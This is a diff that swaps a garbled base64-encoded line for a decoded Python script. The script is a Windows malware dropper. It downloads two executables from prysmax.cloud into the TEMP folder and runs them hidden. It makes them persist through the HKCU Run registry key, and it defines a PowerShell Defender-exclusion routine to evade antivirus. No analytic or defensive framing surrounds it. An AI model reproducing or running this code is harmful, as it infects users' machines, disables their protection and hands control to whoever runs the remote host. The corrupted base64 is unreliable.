@@ -1,1 +1,45 @@
-aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgd2lucmVnIGFzIHJlZwoKYnVybHMgPSBbCiAgICAiaHR0cHM6Ly9wcnlzbWF4LmNsb3VkL2FyY2hpdm8xLmV4ZSIsCiAgICAiaHR0cHM6Ly9wcnlzbWF4LmNsb3VkL2FyY2hpdm8yLmV4ZSIKXQoKZGVmIGRlc2Nhcmdhcl95X2d1YXJkYXIodXJsLCBjYXJwZXRhKTFUGBFxcW71t2BWaUBeSXRxUskYemZafowsID0gb3MucGF0aC5qb2luKGNhcnBldGEsIHVybC5zcGxpdCgnLycpWy0xXSkKICAgIHRyeToKICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHVybCwgc3RyZWFtPVRydWUpCiAgICAgICAgci5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICB3aXRoIG9wZW4obm9tYnJlX2FyY2hpdm9fbG9jYWwsICd3YicpIGFzIGY6CiAgICAgICAgICAgIGZvciBjaHVuayBpbiByLml0ZXJfY29udGVudChjaHVua19zaXplPTFUGBFxcW71t2BWaUBeSXRxUskYemZafow3cml0ZShjaHVuaykKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTFUGBFxcW71t2BWaUBeSXRxUskYemZafowsIGRlc2NhcmdhciBlbCBhcmNoaXZvOiB7ZX0iKQogICAgcmV0dXJuIG5vbWJyZV9hcmNoaXZvX2xvY2FsCgpkZWYgYWdyZWdhcl9hX3JlZ2lzdHJvKG5vbWJyZV9jbGF2ZSwgcnV0YV9hcmNoaXZvKToKICAgIGNsYXZlX3JlZ2lzdHJvID0gciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICB0cnk6CiAgICAgICAgbGxhdmUgPSByZWcuTFUGBFxcW71t2BWaUBeSXRxUskYemZafowVTFUGBFxcW71t2BWaUBeSXRxUskYemZafowWcuS0VZX1NFVF9WQUxVRSkKICAgICAgICByZWcuU2V0VmFsdWVFeChsbGF2ZSwgbm9tYnJlX2NsYXZlLCAwLCByZWcuUkVHX1NaLCBydXRhX2FyY2hpdm8pCiAgICAgICAgcmVnLkNsb3NlS2V5KGxsYXZlKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgYWwgbW9kaWZpY2FyIGVsIHJlZ2lzdHJvOiB7ZX0iKQoKZGVmIGFncmVnYXJfZXhjbHVzaW9uX2RlZmVuZGVyKGNhcnBldGEpOgogICAgdHJ5OgogICAgICAgIGNvbWFuZG8gPSBmIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJ3tjYXJwZXRhfSciCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJwb3dlcnNoZWxsLmV4ZSIsICItQ29tbWFuZCIsIGNvbWFuZG9dLCBjaGVjaz1UcnVlKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgYWwgYWdyZWdhciBleGNsdXNpw7NuOiB7ZX0iKQoKdGVtcF9kaXIgPSBvcy5nZXRlbnYoIlRFTFUGBFxcW71t2BWaUBeSXRxUskYemZafowRlZmVuZGVyKHRlbXBfZGlyKQoKYXJjaGl2b3MgPSBbZGVzY2FyZ2FyX3lfZ3VhcmRhcih1cmwsIHRlbXBfZGlyKSBmb3IgdXJsIGluIGJ1cmxzXQoKZm9yIGFyY2hpdm8gaW4gYXJjaGl2b3M6CiAgICBzdWJwcm9jZXNzLlBvcGVuKFthcmNoaXZvXSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTFUGBFxcW71t2BWaUBeSXRxUskYemZafowVWTFUGBFxcW71t2BWaUBeSXRxUskYemZafowRybyhvcy5wYXRoLmJhc2VuYW1lKGFyY2hpdm8pLCBhcmNoaXZvKQo=
+import os
+import subprocess
+import requests
+import winreg as reg
+
+burls = [
+    "https://prysmax.cloud/archivo1.exe",
+    "https://prysmax.cloud/archivo2.exe"
+]
+
+def descargar_y_guardar(url, carpeta):
+    nombre_archivo_local = os.path.join(carpeta, url.split('/')[-1])
+    try:
+        r = requests.get(url, stream=True)
+        r.raise_for_status()
+        with open(nombre_archivo_local, 'wb') as f:
+            for chunk in r.iter_content(chunk_size=1024):
+                f.write(chunk)
+    except Exception as e:
+        print(f"Error al descargar el archivo: {e}")
+    return nombre_archivo_local
+
+def agregar_a_registro(nombre_clave, ruta_archivo):
+    clave_registro = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    try:
+        llave = reg.OpenKey(reg.HKEY_CURRENT_USER, clave_registro, 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(llave, nombre_clave, 0, reg.REG_SZ, ruta_archivo)
+        reg.CloseKey(llave)
+    except Exception as e:
+        print(f"Error al modificar el registro: {e}")
+
+def agregar_exclusion_defender(carpeta):
+    try:
+        comando = f"Add-MpPreference -ExclusionPath '{carpeta}'"
+        subprocess.run(["powershell.exe", "-Command", comando], check=True)
+    except Exception as e:
+        print(f"Error al agregar exclusión: {e}")
+
+temp_dir = os.getenv("TEMP")
+
+archivos = [descargar_y_guardar(url, temp_dir) for url in burls]
+
+for archivo in archivos:
+    subprocess.Popen([archivo], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    agregar_a_registro(os.path.basename(archivo), archivo)
